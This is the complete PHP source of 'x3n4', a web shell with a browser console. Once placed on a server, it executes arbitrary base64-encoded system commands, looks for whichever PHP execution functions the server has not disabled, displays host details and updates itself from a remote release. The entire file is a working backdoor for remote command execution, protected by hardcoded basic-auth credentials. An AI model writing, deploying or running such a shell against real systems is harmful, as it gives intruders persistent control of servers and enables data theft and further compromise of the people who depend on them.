<?php

define('X3N4_VERSION', 'v0.1.6-alpha');

$user = 'x3n4';
$password = 'P455W0rd';

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
}
function get_shell_command()
{
    static $shell_command;

    if ($shell_command === null) {
        if (is_callable('proc_open') && !is_function_disabled('system')) {
            $shell_command = 'proc_open';
        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
            $shell_command = 'exec';
        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_callable('system') && !is_function_disabled('system')) {
            $shell_command = 'system';
        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
            $shell_command = 'popen';
        }
    }

    return $shell_command;
}
function execute_command($command)
{
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $return = ob_get_contents();
            ob_end_clean();
            return $return;

        case 'shell_exec':
            return @shell_exec($command);

        case 'exec':
            return @exec($command);

        case 'proc_open':
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );

            $process = proc_open($command . ' 2>&1', $descriptors, $pipes, getcwd());

            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $code = proc_close($process);

            return $output;

        default:
            return 'None available function to run your command, sorry. :(';
    }
}
function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}
function is_function_disabled($function)
{
    return in_array($function, disabled_functions());
}
function output_json($output = '')
{
    $output_data = array(
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
        'stdout' => $output
    );
    if (is_callable('json_encode')) {
        header('Content-Type: application/json;');
        echo json_encode($output_data);
    } else {
        echo $output_data['banner'], ' ', $_REQUEST['cmd'], PHP_EOL, $output;
    }
    session_write_close();
    exit(0);
}
function require_auth($user, $password)
{
    $AUTH_USER = $user;
    $AUTH_PASS = $password;
    header('Cache-Control: no-cache, must-revalidate, max-age=0');
    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
    $is_not_authenticated = (
        !$has_supplied_credentials ||
        $_SERVER['PHP_AUTH_USER'] != $AUTH_USER ||
        $_SERVER['PHP_AUTH_PW']   != $AUTH_PASS
    );
    if ($is_not_authenticated) {
        header('HTTP/1.1 401 Authorization Required');
        header('WWW-Authenticate: Basic realm="Access denied"');
        exit;
    }
}

/**
 * CORE
 */
require_auth($user, $password);
session_start();

if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim($_REQUEST['cmd']);
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'upgrade') {
        $options  = array('http' => array('user_agent' => 'custom user agent string'));
        $context  = stream_context_create($options);
        $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
        if ($releases) {
            $asset = $releases[0]->assets[0]->browser_download_url;
            if ($asset) {
                file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
                file_put_contents(__FILE__, file_get_contents($asset, false, $context));
            }
        }
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
        $dir = substr($_REQUEST['cmd'], 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = execute_command(base64_decode($_REQUEST['cmd']) . ' 2>&1');
    output_json(base64_encode($output));
}

/**
 * HTML
 */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 <?php echo X3N4_VERSION; ?></title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    #stdout {
        max-height: 650px;
    }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 <?php echo X3N4_VERSION; ?>
        </h1>

        <ul class="nav nav-tabs" role="tablist">
            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
        </ul>
        <p></p>
        <div class="tab-content">
            <div id="information" role="tabpanel" class="tab-pane table-responsive">
                <table class="table">
                    <tr>
                        <td>System:</td>
                        <td>
                            <?php
                            switch (PHP_OS) {
                                case 'Linux':
                                    $platform_icon = 'fa-linux';
                                    break;
                                case 'WINNT':
                                    $platform_icon = 'fa-windows';
                                    break;
                                case 'Darwin':
                                    $platform_icon = 'fa-osx';
                                    break;
                                default:
                                    $platform_icon = 'fa-unknown';
                            }
                            ?>
                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Current user:</td>
                        <td><?php echo get_current_user(); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP:</td>
                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Name:</td>
                        <td><?php echo $_SERVER['SERVER_NAME']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Sofware:</td>
                        <td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version:</td>
                        <td><?php echo phpversion(); ?></td>
                    </tr>
                    <tr>
                        <td>Client IP:</td>
                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Installed modules:</td>
                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
                    </tr>
                    <tr>
                        <td>Disabled functions:</td>
                        <td><?php echo implode(', ', disabled_functions()); ?></td>
                    </tr>
                    <tr>
                        <td>Shell function:</td>
                        <td><?php echo get_shell_command(); ?></td>
                    </tr>
                </table>
            </div>

            <div id="console" role="tabpanel" class="tab-pane active">
                <pre id="stdout"><?php echo execute_command('cat /etc/motd') . PHP_EOL; ?></pre>
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                        <input type="text" id="stdin" class="form-control" />
                        <span class="input-group-btn">
                            <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script>
        // Create Base64 Object
        var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}

        function x3n4 () {
            this.version = '<?php echo X3N4_VERSION; ?>';
            this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
            this.execCommand = function(command) {
                if (command.trim() == 'clear') {
                    $('#stdout').html('');
                    return;
                }
                command = Base64.encode(command);
                $.post(this.script_path, {cmd: command}, function(data) {
                    if (data.stdout) {
                        $('#stdout').append(data.banner + " " + Base64.decode(command) + "\n");
                        if (data.stdout !== null) {
                            $('#stdout').append(Base64.decode(data.stdout));
                        }
                        $('#pwd').html(data.banner);
                    } else {
                        $('#stdout').append(data);
                    }
                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                });
            }
            this.clickExecCommand = function() {
                window.x3n4.execCommand($('#stdin').val());
                $('#stdin').val('');
            }
            this.checkUpdate = function() {
                $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
                    if (window.x3n4.version !== data[0].tag_name) {
                        $('#stdout').append('/!\\ x3n4 ' + data[0].tag_name + " available. Type 'upgrade' to download the latest version automatically.\n");
                        $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                    }
                });
            }
            this.declareCallbacks = function() {
                $('#btnExecCommand').on('click', this.clickExecCommand);
                $('#stdin').on('keypress', function(ev) {
                    if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                        $('#btnExecCommand').click()
                    }
                });
            }
        }
        window.x3n4 = new x3n4();
        window.x3n4.declareCallbacks();
        window.x3n4.checkUpdate();
    </script>
</body>
</html>
